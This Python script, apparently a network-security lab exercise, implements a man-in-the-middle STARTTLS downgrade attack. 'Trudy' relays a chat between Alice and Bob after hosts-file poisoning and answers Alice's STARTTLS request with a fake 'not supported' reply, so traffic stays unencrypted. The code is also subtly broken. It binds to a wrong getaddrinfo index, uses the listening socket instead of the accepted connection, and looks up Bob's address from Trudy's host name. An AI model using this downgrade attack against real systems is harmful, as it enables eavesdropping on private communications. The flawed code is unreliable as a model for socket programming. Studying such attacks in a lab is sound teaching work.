#After poisoning their hosts file
#Trudy is acting as server to Alice
#Trudy is acting as client to Bob


import socket       #creating sockets
import ssl          #ssl implementation
import sys          #
import optparse     #for options
from threading import Thread   #for multiple communication

'''
parser = optparse.OptionParser(usage = "%prog [options] arg1 arg2" )
parser.add_option( "-d", "--downgrade", type = "string", dest = "targets" )
(options, argv) = parser.parse_args()

#if len(argv) != 

print(options)
print(options.targets)
print(argv)
print(len(argv))
'''


#creating alice side socket
def create_trudyalicesocket():
    
    try:
        trudyalicesocket = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
        print( "Socket 1 creation successful" )
        trudyalicesocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except:
        print( "Socket 1 creation failed: %s" %(socket.error) )

    #getting information about alice
    trudyaliceport = 50112
    aliceinfo = socket.getaddrinfo( "trudy1", trudyaliceport, proto=socket.IPPROTO_TCP)
    print(aliceinfo)
    

    #binding to socket
    trudyalicesocket.bind( aliceinfo[4] )

    return (trudyalicesocket, aliceinfo, trudyaliceport)


#creating bob side socket
def create_trudybobsocket():

    try:
        trudybobsocket = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
        print( "Socket 2 creation successful" )
        trudybobsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except:
        print( "Socket 2 creation failed: %s" %(socket.error) )

    #getting ip address of bob
    trudybobport = 50113
    bobinfo = socket.getaddrinfo( "trudy1" , trudybobport, proto=socket.IPPROTO_TCP)
    print(bobinfo)


    return (trudybobsocket, bobinfo, trudybobport)


#communication between trudy, alice, bob
def communication( trudyalicesocket, trudybobsocket ):

    from_alice = True      #to receive msg from alice
    from_bob = False       #to receive msg from bob

    while True:

        if from_alice:
            recvmsg = trudyalicesocket.recv(1000)
            if recvmsg.decode() == "chat_hello":
                trudyalicesocket.send( b"chat_reply")
            
            elif recvmsg.decode() == "chat_STARTTLS":
                #send chat_STARTTLS_NOT_SUPPORTED msg to Alice
                trudyalicesocket.send( b"chat_STARTTLS_NOT_SUPPORTED" )
            else:
                #forward packets to Bob
                trudybobsocket.send( recvmsg )
            
            from_alice = False
            from_bob = True

        if from_bob:
            recvmsg = trudybobsocket.recv(1000)
            trudyalicesocket.send( recvmsg )
            from_alice = True
            from_bob = False


if sys.argv[1] == '-d' and sys.argv[2] == 'alice1' and sys.argv[3]=='bob1':
    
    #initializing sockets
    trudyalicesocket, aliceinfo, trudyaliceport = create_trudyalicesocket()
    trudybobsocket, bobinfo, trudybobport = create_trudybobsocket()

    #connecting to actual server(i.e. bob1)
    trudybobsocket.connect( bobinfo[1][4])

    #listening to alice socket
    trudyalicesocket.listen(1)

    #accepting connection from alice
    alicesocketinfo, aliceaddr = trudyalicesocket.accept()

    '''
    At this point TCP connection is like-
    Alice-----Trudy-----Bob
    '''

    communication( trudyalicesocket, trudybobsocket )

else:
    print("Wrong input")
    print("Input format: -d alice1 bob1")
